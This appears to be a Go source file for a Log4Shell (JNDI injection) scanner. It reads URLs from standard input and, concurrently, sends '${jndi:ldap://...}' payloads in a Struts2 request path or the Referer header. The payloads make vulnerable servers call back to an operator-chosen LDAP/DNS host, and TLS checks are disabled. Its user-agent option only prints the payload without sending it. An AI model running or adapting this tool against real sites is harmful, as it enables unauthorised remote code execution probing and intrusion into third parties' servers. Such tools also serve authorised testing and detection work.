package main

import (
	"bufio"
	"crypto/tls"
	b32 "encoding/base32"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/michael1026/paramfinder/util"
)

func main() {
	referer := flag.Bool("referer", false, "Use payload in referer header")
	userAgent := flag.Bool("user-agent", false, "Use payload as user-agent")
	struts := flag.Bool("struts", false, "Check payload using Struts2 payload in path")
	collab := flag.String("server", "", "Server you would like DNS pings to")

	flag.Parse()

	if *collab == "" {
		log.Fatal("Please provide a DNS server for the payload")
		return
	}

	if *struts == false && *userAgent == false && *referer == false {
		log.Fatal("Please provide at least one injection point (struts, user-agent, or referer")
		return
	}

	wg := &sync.WaitGroup{}

	client := buildHttpClient()
	urlsToFuzz := make(chan string)

	s := bufio.NewScanner(os.Stdin)

	for i := 0; i < 5; i++ {
		wg.Add(1)

		go func() {
			for rawUrl := range urlsToFuzz {
				findRCEs(rawUrl, client, *collab, *struts, *userAgent, *referer)
			}
			wg.Done()
		}()
	}

	for s.Scan() {
		urlsToFuzz <- s.Text()
	}

	close(urlsToFuzz)

	wg.Wait()
}

func findRCEs(rawUrl string, client *http.Client, collab string, struts bool, userAgent bool, referer bool) {
	fmt.Printf("Testing %s\n", rawUrl)
	sEnc := b32.StdEncoding.EncodeToString([]byte(rawUrl))

	sEnc = strings.Replace(sEnc, "=", "", -1)

	var req *http.Request
	var err error

	if struts {
		req, err = http.NewRequest("GET", rawUrl+"/$%7bjndi:ldap:/$%7blower:/%7d"+collab+"/%7d$%7blower:/%7d/", nil)

		if err != nil {
			fmt.Printf("err %s\n", err)
			return
		}
	} else {
		req, err = http.NewRequest("GET", rawUrl, nil)
	}

	if userAgent {
		fmt.Printf("user agent is %s\n", "${jndi:ldap://"+sEnc+"."+collab+"/}")
	}

	if referer {
		req.Header.Set("Referer", "https://example.com/?a=${jndi:ldap://referrer."+sEnc+"."+collab+"/}")
	}

	req.Close = true

	resp, err := client.Do(req)

	if err != nil {
		fmt.Printf("err %s\n", err)
		return
	}

	resp.Body.Close()
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = util.AppendIfMissing(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func buildHttpClient() (c *http.Client) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: time.Duration(time.Duration(10) * time.Second),
		Transport: &http.Transport{
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 500,
			MaxConnsPerHost:     500,
			DialContext: (&net.Dialer{
				Timeout: time.Duration(time.Duration(10) * time.Second),
			}).DialContext,
			TLSHandshakeTimeout: time.Duration(time.Duration(10) * time.Second),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				Renegotiation:      tls.RenegotiateOnceAsClient,
				ServerName:         "",
			},
		}}

	return client
}
